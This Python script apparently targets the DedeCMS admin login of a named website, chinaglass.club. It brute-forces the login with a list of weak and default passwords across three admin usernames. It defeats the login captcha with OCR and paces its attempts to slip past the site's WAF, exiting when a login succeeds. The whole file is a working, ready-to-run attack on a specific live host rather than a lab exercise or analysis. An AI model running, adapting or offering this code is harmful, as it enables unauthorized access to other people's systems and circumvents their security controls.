#!/usr/bin/env python3
"""bf_dede_v4.py - chinaglass.club DedeCMS爆破 v4 (简化)
直接取验证码OCR -> 提交 -> 按响应分流(验证码错重取/密码错换/其他=可能中)
"""
import urllib.request, urllib.parse, ssl, re, http.cookiejar, sys, time, io
import ddddocr
from PIL import Image

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
       'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
       'Accept-Language': 'zh-CN,zh;q=0.9', 'Accept-Encoding': 'identity', 'Connection': 'keep-alive'}
BASE = 'http://chinaglass.club'
LOGIN_URL = BASE + '/admin/login.php'
CAP_URL = BASE + '/include/vdimgck.php'
PASSWORDS = ["admin", "admin123", "123456", "admin888", "chinaglass", "dedecms", "admin666", "12345678", "Admin123", "admin@123", "a123456"]
ocr = ddddocr.DdddOcr(show_ad=False)
ocrb = ddddocr.DdddOcr(show_ad=False, beta=True)

def get_code(opener):
    for _ in range(5):
        time.sleep(1.2)
        try:
            r = opener.open(urllib.request.Request(CAP_URL, headers={**UA, 'Referer': LOGIN_URL}), timeout=10)
            img = r.read()
            if img[:2] != b'\xff\xd8':
                continue
            im = Image.open(io.BytesIO(img)).convert('L')
            im = im.resize((im.width * 3, im.height * 3), Image.LANCZOS)
            im = im.point(lambda p: 255 if p > 130 else 0)
            buf = io.BytesIO(); im.save(buf, 'PNG')
            c1 = ocr.classification(img)
            c2 = ocrb.classification(buf.getvalue())
            return c1 if c1 == c2 else (c2 if len(c2) == 4 else c1)
        except Exception:
            continue
    return None

def do_login(opener, user, pw, code):
    data = urllib.parse.urlencode({'gotopage': '/admin/', 'dopost': 'login', 'adminstyle': 'newdedecms',
                                   'userid': user, 'pwd': pw, 'validate': code}).encode()
    try:
        req = urllib.request.Request(LOGIN_URL, data=data,
                                     headers={**UA, 'Content-Type': 'application/x-www-form-urlencoded',
                                              'Referer': LOGIN_URL})
        resp = opener.open(req, timeout=10)
        b = resp.read(8000).decode('gbk', 'ignore')
        fu = resp.geturl()
        st = resp.status
    except urllib.error.HTTPError as e:
        st, b, fu = e.code, e.read(8000).decode('gbk', 'ignore'), e.geturl()
    except Exception:
        return 'error'
    if 'stopinfo' in fu or 'vhostgo' in fu:
        return 'waf'
    if '楠岃瘉鐮佷笉姝' in b:
        return 'cap'
    if '閿欒' in b or '错误' in b or '瀵嗙爜' in b or '不存在' in b:
        return 'pw'
    if st == 302 and 'login' not in fu.lower():
        return 'HIT:' + fu
    return 'UNKNOWN:' + b[:100].replace(chr(10), ' ')

def main():
    for user in ['admin', 'root', 'administrator']:
        cj = http.cookiejar.CookieJar()
        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj),
                                             urllib.request.HTTPSHandler(context=ctx))
        try:
            opener.open(urllib.request.Request(LOGIN_URL, headers=UA), timeout=10).read()
        except Exception:
            pass
        for pw in PASSWORDS:
            for _ in range(5):
                code = get_code(opener)
                if not code:
                    print('cap-fail %s/%s, sleep 30' % (user, pw), flush=True)
                    time.sleep(300)
                    continue
                r = do_login(opener, user, pw, code)
                if r == 'cap':
                    continue  # 验证码错, 重取(密码不变)
                if r == 'pw':
                    print('pw-wrong %s/%s' % (user, pw), flush=True)
                    time.sleep(8)
                    break
                if r == 'waf':
                    print('WAF %s/%s sleep 60' % (user, pw), flush=True)
                    time.sleep(300)
                    break
                if r.startswith('HIT'):
                    print('!!! HIT: %s/%s %s' % (user, pw, r), flush=True)
                    sys.exit(0)
                print('CHECK %s/%s: %s' % (user, pw, r[:80]), flush=True)
                time.sleep(8)
                break
        print('user %s done' % user, flush=True)
    print('=== NO HIT ===')

if __name__ == '__main__':
    main()
